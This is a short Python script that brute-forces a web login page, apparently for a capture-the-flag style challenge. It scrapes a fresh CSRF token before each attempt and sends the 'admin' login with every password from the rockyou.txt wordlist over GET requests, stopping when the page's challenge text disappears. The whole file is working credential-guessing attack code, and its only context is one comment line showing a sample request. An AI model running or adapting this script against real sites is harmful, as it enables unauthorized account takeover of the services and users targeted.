import requests
import sys
import re

# GET /sign_in?login=IvanPetrov&password=dddd&csrf_token=e54623c0320d4faee132f33d95b5e3a2 HTTP/1.1
# <input name="csrf_token" type="hidden" value="e54623c0320d4faee132f33d95b5e3a2">
def brute_force(url):
	session = requests.session()
	login = session.get(f"{url}")
	# open pasword file 
	with open("/usr/share/wordlists/rockyou.txt","r",encoding="ISO-8859-1") as file:
		
		passwords = [line.strip() for line in file]
		for i in passwords:
			login = session.get(f"{url}")
			# Get csrf token from the login form
			csrf_token = re.search('"csrf_token" type="hidden" value="(.*?)"',login.text)
			csrf_token = csrf_token.group(1)
			print(f"csrf token --> {csrf_token}")
			print(f"password --> {i}")
			target_url = f"{url}sign_in?login=admin&password={i}&csrf_token={csrf_token}"
			resp = session.get(target_url)
			# print(resp.text)
			# print("\n")
			if not "Your goal is" in resp.text:
				print("It worked")
				print(i)			
				break	
			

brute_force("")

